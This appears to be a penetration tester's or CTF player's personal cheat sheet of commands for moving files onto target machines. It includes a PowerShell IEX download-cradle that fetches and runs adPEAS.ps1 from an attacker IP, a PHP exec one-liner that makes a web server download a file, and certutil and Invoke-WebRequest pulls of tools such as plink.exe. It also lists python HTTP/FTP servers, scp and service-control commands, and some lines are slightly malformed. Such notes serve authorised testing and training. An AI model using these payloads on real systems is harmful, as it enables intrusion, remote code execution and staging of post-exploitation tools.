# Linux

wget http://IP:PORT/FILE
# python 
python -m SimpleHTTPServer
python3 -m http.server

# Windows 
Powershell "IEX(New-Object Net.WebClient).downloadString('http://192.168.181.128/adPEAS.ps1')"

Invoke-WebRequest -Uri ATTACK_IP/FILE -OutFile FILE NAME

# php
<?php echo exec("powershell -command \"(New-Object System.Net.WebClient).DownloadFile('http://10.10.17.185/FILE_NAME','OUT_FILE_NAME')\""); ?>

powershell Invoke-WebRequest -Uri http://10.10.14.15/plink.exe -OutFile c:\Users\shaun\Downloads\plink.exe

# scp 
scp [OPTION] [user@]SRC_HOST:]file1 user@target:/tmp/FILE
SCP -i KEY FILE user@target:/tmp/FILE
-i for ssh key
P - Specifies the remote host ssh port.
-p - Preserves files modification and access times.
-q - Use this option if you want to suppress the progress meter and non-error messages.
-C - This option forces scp to compresses the data as it is sent to the destination machine.



# Certutil
certutil -urlcache -f http://IP/FILE OUTPUTFILENAME



# FTP
python -m pyftpdlib 21
ftp 10.10.10.10
# stop service
sc stop SERVICE

sc query SERVICE to check service

sc start SERVICE to start 



Invoke-WebRequest -Uri http//192.168.181.128/linPEAS.ps1 -OutFile
File C:\Users\administrator\Documents\WindowsPowerShell\Modules\Recon\adPEAS.ps1

 